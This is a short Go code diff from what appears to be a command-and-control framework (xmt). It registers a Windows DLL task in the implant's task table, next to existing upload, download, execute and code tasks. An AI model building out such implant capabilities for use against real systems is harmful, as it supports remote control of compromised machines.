@@ -3,6 +3,7 @@ package task
 import (
 	"context"
 
+	"github.com/iDigitalFlame/xmt/c2/task/wintask"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/device"
 )
@@ -25,11 +26,15 @@ const (
 // Mappings is an fixed size array that contains the Tasker mappings for each ID value. Values that are less than 22
 // are ignored. Adding a mapping to here will allow it to be executed via the client Scheduler.
 var Mappings = [256]Tasker{
+	// Built-in Mappings
 	TvRefresh:  simpleTask(TvRefresh),
 	TvUpload:   simpleTask(TvUpload),
 	TvDownload: simpleTask(TvDownload),
 	TvExecute:  simpleTask(TvExecute),
 	TvCode:     simpleTask(TvCode),
+
+	// WinTask related Mappings
+	wintask.DLLTask: wintask.DLLTask,
 }
 
 type simpleTask uint8
